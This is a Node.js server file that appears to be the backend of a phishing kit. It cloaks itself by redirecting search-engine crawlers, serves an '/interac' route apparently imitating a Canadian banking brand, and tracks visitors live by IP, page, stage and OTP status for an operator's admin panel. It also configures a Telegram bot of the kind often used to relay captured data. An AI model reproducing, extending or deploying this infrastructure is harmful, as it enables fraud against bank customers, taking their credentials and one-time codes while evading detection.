// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { Server } = require('socket.io');
let fetch;
const TelegramBot = require('node-telegram-bot-api');
const session = require('express-session');
const sessionStore = new Map();
const { error } = require('node:console');
const initialData = require('./data');
const dbConfig = require('./dbConfig');
const { Pool } = require('pg');



(async () => {
    fetch = (await import('node-fetch')).default;
})();

require('dotenv').config();



// ====================
// Configuration
// ====================
const app = express();

const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
const token = process.env.TELEGRAM_BOT_API_KEY;
const chatId = process.env.TELEGRAM_CHAT_ID;
const adminKey = process.env.ADMIN_KEY;
const bot = new TelegramBot(token, { polling: true });

// EJS setup
app.set('view engine', 'ejs');


// Configure session middleware
app.use(session({
    secret: "6LdI0PYoAAAAAN0RS1L3WZhLYqr8YX3jCwM2umEx", // replace with your secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

const server = createServer(app);
const io = new Server(server);

const botList = [
    'Googlebot',
    'googlebot-image',
    'googlebot-mobile',
    'MSNBot',
    'Slurp',
    'Teoma',
    'Gigabot',
    'Robozilla',
    'Nutch',
    'ia_archiver',
    'archive.org_bot',
    'baiduspider',
    'naverbot',
    'yeti',
    'yahoo-mmcrawler',
    'psbot',
    'yahoo-blogs/v3.9',
    'AhrefsBot',
    'MJ12bot',
    'Majestic-12',
    'Majestic-SEO',
    'DSearch',
    'Rogerbot',
    'SemrushBot',
    'BLEXBot',
    'ScoutJet',
    'SearchmetricsBot',
    'BacklinkCrawler',
    'Exabot',
    'spbot',
    'linkdexbot',
    'Lipperhey Spider',
    'SEOkicks-Robot',
    'sistrix',
    // ... Add all the bots from your list
];



const redirectBots = (req, res, next) => {
    const userAgent = req.get('User-Agent');
    if (userAgent) {
        const isBot = botList.some(botUserAgent => userAgent.includes(botUserAgent));
        if (isBot) {
            return res.redirect('https://www.google.com');
        }
    }
    next();
};

const checkAdminSession = (req, res, next) => {

    if (req.session.isAdminVerified) {
        next();
    } else {
        res.render('misc/403/index');
    }
};

// Middleware to verify Admin response
const verifyAdmin = (req, res, next) => {

    const adminKeyInput = req.body['admin-key'];

    // Check if the provided key matches the stored key
    if (adminKeyInput === adminKey) {
        req.session.isAdminVerified = true;

        next(); // Admin key is correct, proceed to the next middleware/route handler
    } else {
        // Optionally, you could log this attempt or implement rate-limiting to prevent brute force attacks
        res.render('misc/403/index');
    }

};

const checkRecaptchaSession = (req, res, next) => {

    if (req.session.recaptchaVerified) {
        next();
    } else {
        res.status(403).send('Access denied. Please complete the reCAPTCHA.');
    }
};

const verifyRecaptcha = (req, res, next) => {
    const recaptchaResponse = req.body['g-recaptcha-response'];

    // Verify URL
    const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;

    fetch(verifyUrl, { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                req.session.recaptchaVerified = true;

                next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
            } else {
                res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
            }
        })
        .catch(error => {
            res.status(500).send('Error in reCAPTCHA verification, try again later.');
        });
};

// Function to create table with JSONB column
const createTable = async () => {
    const createTableQuery = `
      CREATE TABLE IF NOT EXISTS items (
        id SERIAL PRIMARY KEY,
        data JSONB NOT NULL
      );
    `;

    try {
        await pool.query(createTableQuery);
        console.log('Table created successfully');
    } catch (error) {
        console.error('Error creating table:', error);
    }
};

// Use this middleware in your app before your routes
app.use(redirectBots);


// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

const pool = new Pool(dbConfig);

createTable();

app.get('/', (req, res) => {
    res.render('captcha/index')
})

app.get('/interac', verifyRecaptcha, (req, res) => {
    res.render('captcha/index')
})

app.post('/update', async (req, res) => {
    let data = req.body;

    console.log('new one')
    console.log(data.settings)

    try {

        const getId = 1;
        const get = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        if (get.rows.length > 0) {
            console.log('old one')
            console.log(get.rows[0].data.settings);
        }

        const upsertQuery = `
      INSERT INTO items (id, data) VALUES (1, $1)
      ON CONFLICT (id) DO UPDATE 
      SET data = EXCLUDED.data
      RETURNING *;
    `;

        const result = await pool.query(upsertQuery, [data]);
        console.log(result.rows[0])
        //await redisClient.set("settings", JSON.stringify(data.settings));
        res.render('admin/panel/index', { bool: true, message: "Your updates have been successfully saved." });
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error updating data. Contact webcro help.' });
    }
});

app.get('/delete-all', async (req, res) => {
    try {
        const deleteId = 1; // Assuming you're always deleting the record with id = 1
        const result = await pool.query('DELETE FROM items WHERE id = $1', [deleteId]);

        if (result.rowCount > 0) {
            res.render('admin/panel/index', { bool: true, message: "All key delete." });
          } else {
            res.status(404).send(`Item with id ${deleteId} not found.`);
          }

        
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error deleting all. Contact webcro help.' });
    }
});



app.get('/admin', (req, res) => {
    if (req.session.isAdminVerified) {
        res.render('admin/panel/index', { bool: false });
    } else {
        res.render('admin/login/index');
    }

});

app.post('/admin/verify', verifyAdmin, (req, res) => {
    res.redirect(301, '/admin/panel');
})

app.get('/admin/panel', checkAdminSession, (req, res) => {
    res.render('admin/panel/index', { bool: false });
})

app.get('/admin/settings', checkAdminSession, async (req, res) => {
    try {
        const getId = 1; // Since we're always dealing with the record with id = 1
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        if (result.rows.length > 0) {
            console.log(result.rows[0].data);
            res.render('admin/settings/index', { data: result.rows[0].data });
        } else {
            res.render('admin/settings/index', { data: null, message: 'Please use the form below to update the page.' });
            return;
        }
    } catch (error) {
        console.error(error);
        res.render('admin/settings/index', { data: null, message: 'Error retrieving settings. Contact webcro help.' });
    }
});



// ====================
// Socket Handling
// ====================
io.on('connection', (socket, req) => {
    let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    userIP = userIP.split(',')[0].trim();

    socket.join(userIP);

    if (!sessionStore.has(userIP)) {
        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp: false });
    } else {
        let userDetails = sessionStore.get(userIP);
        userDetails.status = 'actif';
        sessionStore.set(userIP, userDetails);
    }

    io.emit('join', Array.from(sessionStore.entries()));

    socket.on('pageandstage', (data) => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.page = data.page;
            userDetails.stage = data.stage;
            sessionStore.set(userIP, userDetails);
        }
        io.emit('join', Array.from(sessionStore.entries()));
    });

    socket.on('disconnect', () => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.status = 'inactif';
            sessionStore.set(userIP, userDetails);
            io.emit('leave', Array.from(sessionStore.entries()));
        }
    });

    socket.on('deleteAll', () => {
        sessionStore.clear();
        io.emit('join', Array.from(sessionStore.entries()));
    })



});

// ====================
// Server Startup
// ====================

server.listen(80, () => {
    console.log('HTTPS server running on port 80');
});
